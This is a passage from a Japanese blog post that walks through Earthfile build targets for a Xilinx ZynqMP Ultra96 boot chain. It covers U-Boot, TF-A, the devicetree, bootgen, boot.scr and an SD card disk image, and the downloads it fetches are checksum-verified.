<span id="cb14-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> nproc=$(nproc)</span>
<span id="cb14-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> u-boot.config .config</span>
<span id="cb14-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="va">CROSS_COMPILE</span><span class="op">=</span>aarch64-linux-gnu- <span class="va">ARCH</span><span class="op">=</span>aarch64 <span class="dt">\</span></span>
<span id="cb14-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">make</span> <span class="at">-j</span><span class="va">$nproc</span> u-boot.elf</span>
<span id="cb14-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-11" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT u-boot.elf</span>
<span id="cb14-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-12" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT scripts/dtc/dtc /dtc</span>
<span id="cb14-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb14-13" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT tools/mkimage /mkimage</span></code></pre></div>
<p>Linux と同様に、コンフィグはこちらも <code>menuconfig</code> で作ったものをそのまま入れています。ちなみにこのコンフィグは <code>xilinx_zynqmp_virt_defconfig</code> をベースに使わない機能を削り、U-Boot 自身が使う Devicetree Blob をどうロードするかを変更したものです。Devicetree は FSBL にロードさせたいので <code>CONFIG_OF_BOARD</code> に変更しています。</p>
<pre><code>Device Tree Control  ---&gt;
    Provider of DTB for DT control (Provided by the board (e.g a previous loader) at runtime)  ---&gt;
        (X) Provided by the board (e.g a previous loader) at runtime</code></pre>
<h3 id="trusted-firmware-a-tf-a">Trusted Firmware-A (TF-A)</h3>
<p>以前は arm-trusted-firmware やそれを略して ATF と呼ばれていたやつです。これもいつもどおりの方法でビルドします。<code>ZYNQMP_CONSOLE=cadence1</code> をつけるとメッセージ出力先が UART1 になってくれます。</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb16-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-1" aria-hidden="true" tabindex="-1"></a>tf-a:</span>
<span id="cb16-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb16-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="op">--mount=type=tmpfs,target=/tmp</span> <span class="op">\</span></span>
<span id="cb16-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">curl</span> <span class="at">--no-progress-meter</span> <span class="at">-L</span> https://github.com/Xilinx/arm-trusted-firmware/archive/refs/tags/xilinx-v2022.1.tar.gz <span class="at">-o</span> /tmp/archive.tar.gz <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb16-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-5" aria-hidden="true" tabindex="-1"></a>        <span class="bu">echo</span> <span class="st">'e7d6a4f30d35b19ec54d27e126e7edc2c6a9ad6d53940c6b04aa1b782c55284e  /tmp/archive.tar.gz'</span> <span class="kw">|</span> <span class="fu">sha256sum</span> <span class="at">-c</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb16-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-6" aria-hidden="true" tabindex="-1"></a>        <span class="fu">tar</span> xf /tmp/archive.tar.gz <span class="at">--strip-components</span><span class="op">=</span>1</span>
<span id="cb16-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> nproc=$(nproc)</span>
<span id="cb16-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="va">CROSS_COMPILE</span><span class="op">=</span>aarch64-linux-gnu- <span class="va">ARCH</span><span class="op">=</span>aarch64 <span class="dt">\</span></span>
<span id="cb16-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-9" aria-hidden="true" tabindex="-1"></a>        <span class="fu">make</span> <span class="at">-j</span><span class="va">$nproc</span> PLAT=zynqmp RESET_TO_BL31=1 ZYNQMP_CONSOLE=cadence1</span>
<span id="cb16-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb16-10" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT build/zynqmp/release/bl31/bl31.elf /</span></code></pre></div>
<h3 id="devicetree-blob">Devicetree Blob</h3>
<p>XSCT で生成した <code>.dts</code> に必要なものを追記して、それを U-Boot と Linux の両方にロードさせることにします。<code>gcc</code> はプリプロセッサを処理するために呼んでいます。渡しているオプションは <a href="https://github.com/Xilinx/linux-xlnx/blob/75872fda9ad270b611ee6ae2433492da1e22b688/scripts/Makefile.lib#L351-L355">Linux カーネルにならった</a>ものです。</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb17-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-1" aria-hidden="true" tabindex="-1"></a>system.dtb:</span>
<span id="cb17-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb17-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +generate-src/device-tree .</span>
<span id="cb17-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +linux/include include</span>
<span id="cb17-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +u-boot/dtc .</span>
<span id="cb17-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> system-top-append.dts .</span>
<span id="cb17-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">cat</span> system-top-append.dts <span class="op">&gt;&gt;</span> system-top.dts <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb17-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-8" aria-hidden="true" tabindex="-1"></a>        <span class="fu">gcc</span> <span class="at">-E</span> <span class="at">-nostdinc</span> <span class="at">-undef</span> <span class="at">-D__DTS__</span> <span class="at">-x</span> assembler-with-cpp <span class="at">-Iinclude</span> <span class="at">-o</span> <span class="at">-</span> system-top.dts <span class="kw">|</span> <span class="ex">./dtc</span> <span class="at">-@</span> <span class="at">-p</span> 0x1000 <span class="at">-I</span> dts <span class="at">-O</span> dtb <span class="at">-o</span> system.dtb</span>
<span id="cb17-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb17-9" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT system.dtb</span></code></pre></div>
<h3 id="bootgen-と-boot.bin">Bootgen と boot.bin</h3>
<p><code>boot.bin</code> の生成に使う <code>bootgen</code> は <a href="https://github.com/Xilinx/bootgen">GitHub にソースコードがあります</a>。まずこれをビルドします。ソースコードを持ってきて <code>make</code> すれば、同じディレクトリ内に実行ファイル <code>bootgen</code> が出来上がります。</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb18-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-1" aria-hidden="true" tabindex="-1"></a>bootgen:</span>
<span id="cb18-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb18-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="op">--mount=type=tmpfs,target=/tmp</span> <span class="op">\</span></span>
<span id="cb18-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">curl</span> <span class="at">--no-progress-meter</span> <span class="at">-L</span> https://github.com/Xilinx/bootgen/archive/refs/tags/xilinx_v2022.1.tar.gz <span class="at">-o</span> /tmp/archive.tar.gz <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb18-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-5" aria-hidden="true" tabindex="-1"></a>        <span class="bu">echo</span> <span class="st">'a7db095abda9820babbd0406e7036d663e89e8c7c27696bf4227d8a2a4276d13  /tmp/archive.tar.gz'</span> <span class="kw">|</span> <span class="fu">sha256sum</span> <span class="at">-c</span> <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb18-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-6" aria-hidden="true" tabindex="-1"></a>        <span class="fu">tar</span> xf /tmp/archive.tar.gz <span class="at">--strip-components</span><span class="op">=</span>1</span>
<span id="cb18-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">make</span></span>
<span id="cb18-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb18-8" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT bootgen</span></code></pre></div>
<p>次に <code>boot.bin</code> に含めるファイルとその構成を指示する <code>.bif</code> ファイルを作ります。ここに書いた <code>system.dtb</code> は U-Boot が使うものです。ロード先のアドレス <code>0x100000</code> は U-Boot の <code>CONFIG_XILINX_OF_BOARD_DTB_ADDR=0x100000</code> に対応しています。<a href="https://docs.xilinx.com/r/en-US/ug1283-bootgen-user-guide/destination_cpu">UG1283</a> にある通り、PMUFW のロードのさせ方には <code>[pmufw_image]</code> と <code>[destination_cpu=pmu]</code> の2通りあり、その違いは BootROM にロードさせるか FSBL にロードさせるかです。BootROM にロードさせると PMUFW 実行直後のバージョンなどの方法が出てこない気がする<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>ので FSBL にロードさせています。</p>
<pre><code>all:
{
  [destination_cpu=a53-0, bootloader]                       fsbl.elf
  [destination_cpu=pmu]                                     pmufw.elf
  [destination_device=pl]                                   system.bit
  [destination_cpu=a53-0, exception_level=el-3, trustzone]  bl31.elf
  [destination_cpu=a53-0, exception_level=el-2]             u-boot.elf
  [destination_cpu=a53-0, load=0x100000]                    system.dtb
  [destination_cpu=r5-lockstep]                             ipi-led.elf
}</code></pre>
<p>あとはこれまでのターゲットでビルドしてきた必要なファイルと <code>.bif</code> ファイルを持ってきて、<code>bootgen</code> コマンドを実行すれば OK です。</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb20-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-1" aria-hidden="true" tabindex="-1"></a>boot.bin:</span>
<span id="cb20-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb20-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +app-r5-0/bin/ipi-led.elf .</span>
<span id="cb20-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +bootgen/bootgen .</span>
<span id="cb20-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +fsbl.elf/ .</span>
<span id="cb20-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +generate-src/system.bit .</span>
<span id="cb20-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +pmufw.elf/ .</span>
<span id="cb20-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +system.dtb/ .</span>
<span id="cb20-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +tf-a/bl31.elf .</span>
<span id="cb20-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +u-boot/u-boot.elf .</span>
<span id="cb20-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> boot.bif .</span>
<span id="cb20-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="ex">./bootgen</span> <span class="at">-arch</span> zynqmp <span class="at">-image</span> boot.bif <span class="at">-o</span> boot.bin</span>
<span id="cb20-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb20-13" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT boot.bin</span></code></pre></div>
<h3 id="boot.scr">boot.scr</h3>
<p>U-Boot には、ブートデバイスのファイルシステム直下にあるスクリプト <code>boot.scr</code> を実行してくれる機能があります。これを使ってカーネルがある場所を指示したり、ロードしたカーネルでブートさせたりします。<code>boot.scr</code> は、U-Boot のコマンドをテキストファイルに書き、<code>mkimage</code> に渡して作ります。</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb21-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb21-1" aria-hidden="true" tabindex="-1"></a>boot.scr:</span>
<span id="cb21-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb21-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb21-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb21-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +u-boot/mkimage .</span>
<span id="cb21-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb21-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> boot.cmd .</span>
<span id="cb21-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb21-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="ex">./mkimage</span> <span class="at">-c</span> none <span class="at">-A</span> arm64 <span class="at">-T</span> script <span class="at">-d</span> boot.cmd boot.scr</span>
<span id="cb21-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb21-6" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT boot.scr</span></code></pre></div>
<p>ブートデバイスとして使う SD カードには2つのパーティションを作り、1つ目のパーティションに <code>boot.bin</code>, <code>boot.scr</code>, <code>system.dtb</code> を、2つ目のパーティションに Ubuntu ということにします。開発時の書き換えやすさを優先して、<code>system.dtb</code> も1つ目のパーティションに置いています。ということで <code>boot.cmd</code> はこんな感じです。カーネルは2つ目のパーティションの <code>/boot</code> にあるので <code>mmc 0:2 ...</code>, <code>system.dtb</code> は1つ目のパーティション直下にあるので <code>mmc 0:1 ...</code> になります。あとはファイルをロードしたアドレスを <code>booti</code> コマンドに渡してブートさせます。initramfs を使わないので、<code>booti</code> の第2引数は <code>-</code> にします。</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb22-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">load</span> mmc 0:2 <span class="va">${kernel_addr_r}</span> /boot/vmlinuz-5.15.19</span>
<span id="cb22-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">load</span> mmc 0:1 <span class="va">${fdt_addr_r}</span> /system.dtb</span>
<span id="cb22-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">booti</span> <span class="va">${kernel_addr_r}</span> <span class="at">-</span> <span class="va">${fdt_addr_r}</span></span></code></pre></div>
<p>ちなみに、<code>bindeb-pkg</code> で作ったカーネルの <code>.deb</code> パッケージは、Linux カーネルに含まれる <code>.dts</code> から作った <code>.dtb</code> を <code>/usr/lib/linux-image-*</code> にインストールするようです。カーネルにあるもので十分なケースではこちらのパスを設定すればよいです。</p>
<h3 id="sd-カードのディスクイメージも作っちゃう">SD カードのディスクイメージも作っちゃう</h3>
<p>ここまでで必要なファイルが全て揃いました。でも、これですぐ Ultra96 で動かせるかといえば ✗ です。SD カードにパーティションを切って、それぞれフォーマットして、ファイルをコピーして…と、地味に面倒な作業が残っています。少しでも作業を減らすために、<code>Earthfile</code> の中で SD カードのディスクイメージまで作ってしまいます。</p>
<p>最初にパーティション毎にイメージを作ってフォーマット &amp; データのコピー、最後にそれらを結合して <code>sfdisk</code> でパーティションテーブルの書き込み、という感じのことをやっています。<code>loop</code> デバイスの作成や <code>mount</code> などを実行しているため、ここだけは仕方なく <code>--privileged</code> をつけています。いきなりディスクイメージを作らずパーティション毎にファイルを分けて構築しているのは、コンテナ内で <code>mount</code> は動くけど <code>losetup</code> はうまく動いてくれない場合があったことと、そもそもカーネルモジュール <code>loop</code> のパラメータ <code>max_part</code> が指定しなければ大抵0なため、パーティションを持つ <code>loop</code> デバイスの作成がコンテナ内だけの処理で完結しにくいためです。</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb23-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-1" aria-hidden="true" tabindex="-1"></a>disk.img.zst:</span>
<span id="cb23-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb23-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +boot.tar/ .</span>
<span id="cb23-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +rootfs.tar/ .</span>
<span id="cb23-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> DISK_IMG_PART1_SIZE=16M</span>
<span id="cb23-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">ARG</span> DISK_IMG_PART2_SIZE=256M</span>
<span id="cb23-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="op">--mount=type=tmpfs,target=/tmp</span> <span class="op">--privileged</span> <span class="op">\</span></span>
<span id="cb23-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-8" aria-hidden="true" tabindex="-1"></a>        <span class="fu">truncate</span> <span class="at">-s</span> <span class="st">&quot;</span><span class="va">$DISK_IMG_PART1_SIZE</span><span class="st">&quot;</span> /tmp/boot.img <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-9" aria-hidden="true" tabindex="-1"></a>        <span class="ex">mkfs.vfat</span> <span class="at">-F</span> 16 /tmp/boot.img <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">mount</span> /tmp/boot.img /mnt <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-11" aria-hidden="true" tabindex="-1"></a>        <span class="fu">tar</span> xf boot.tar <span class="at">-C</span> /mnt <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-12" aria-hidden="true" tabindex="-1"></a>        <span class="fu">umount</span> /mnt <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-13" aria-hidden="true" tabindex="-1"></a>        <span class="fu">truncate</span> <span class="at">-s</span> <span class="st">&quot;</span><span class="va">$DISK_IMG_PART2_SIZE</span><span class="st">&quot;</span> /tmp/root.img <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-14" aria-hidden="true" tabindex="-1"></a>        <span class="ex">mkfs.ext4</span> /tmp/root.img <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-15" aria-hidden="true" tabindex="-1"></a>        <span class="fu">mount</span> /tmp/root.img /mnt <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-16" aria-hidden="true" tabindex="-1"></a>        <span class="fu">tar</span> xf rootfs.tar <span class="at">--xattrs</span> <span class="at">--xattrs-include</span><span class="op">=</span><span class="st">'*'</span> <span class="at">-C</span> /mnt <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-17" aria-hidden="true" tabindex="-1"></a>        <span class="fu">umount</span> /mnt <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-18" aria-hidden="true" tabindex="-1"></a>        <span class="fu">truncate</span> <span class="at">-s</span> 1M /tmp/header.img <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-19" aria-hidden="true" tabindex="-1"></a>        <span class="fu">cat</span> /tmp/header.img /tmp/boot.img /tmp/root.img <span class="op">&gt;</span> /tmp/disk.img <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-20" aria-hidden="true" tabindex="-1"></a>        <span class="bu">echo</span> <span class="st">&quot;label: dos\n1M,</span><span class="va">${DISK_IMG_PART1_SIZE}</span><span class="st">,e\n,</span><span class="va">${DISK_IMG_PART2_SIZE}</span><span class="st">,L\n&quot;</span> <span class="kw">|</span> <span class="ex">sfdisk</span> /tmp/disk.img <span class="kw">&amp;&amp;</span> <span class="dt">\</span></span>
<span id="cb23-21"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-21" aria-hidden="true" tabindex="-1"></a>        <span class="ex">zstd</span> <span class="at">--no-progress</span> <span class="at">-9</span> /tmp/disk.img <span class="at">-o</span> disk.img.zst</span>
<span id="cb23-22"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-22" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT disk.img.zst</span>
<span id="cb23-23"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-24"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-24" aria-hidden="true" tabindex="-1"></a>boot.tar:</span>
<span id="cb23-25"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-25" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> +prep</span>
<span id="cb23-26"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-26" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +boot.scr/boot.scr boot/</span>
<span id="cb23-27"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-27" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +boot.bin/ boot/</span>
<span id="cb23-28"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-28" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +system.dtb/ boot/</span>
<span id="cb23-29"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-29" aria-hidden="true" tabindex="-1"></a>    <span class="kw">RUN</span> <span class="fu">tar</span> <span class="at">--create</span> <span class="at">-f</span> boot.tar <span class="at">-C</span> boot .</span>
<span id="cb23-30"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb23-30" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT boot.tar</span></code></pre></div>
<p>もちろんディスクイメージを作ったからといって、なにか変更を加えたときに毎回焼き直す必要はありません。例えば RPU のアプリケーションや Devicetree を変更しただけなら第1パーティションだけ、といった感じに2回目以降は変更があった箇所だけ書き直せば十分です。またせっかく載せたリッチな Linux 環境を活用して、USB メモリやネットワーク経由でファイルが転送できると思います。APU のアプリケーションは、何かしらの修正を加えたものをシュッと転送してすぐ試す、ができます。</p>
<p>もちろん Ultra96 は SD カードからしかブートできないわけではありません。JTAG を使ってロードし直すのもアリですね。</p>
<h3 id="ビルド">ビルド！</h3>
<p>Earthly は1回のコマンド実行で1つのターゲットしか呼び出せないので、最終的に必要となるものをまとめるターゲットを作っておくのが便利です。今回の <code>Earthfile</code> では <code>build</code> がこれに対応します。<code>RUN</code> などのコマンドを使わないなら、<code>FROM</code> に <code>scratch</code> が指定できます。</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><span id="cb24-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-1" aria-hidden="true" tabindex="-1"></a>build:</span>
<span id="cb24-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">FROM</span> scratch</span>
<span id="cb24-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +disk.img.zst/ .</span>
<span id="cb24-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +app-r5-0/bin/ipi-led.elf .</span>
<span id="cb24-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +boot.bin/ .</span>
<span id="cb24-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +boot.scr/ .</span>
<span id="cb24-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +fsbl.elf/ .</span>
<span id="cb24-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +generate-src/system.bit .</span>
<span id="cb24-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +pmufw.elf/ .</span>
<span id="cb24-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +system.dtb/ .</span>
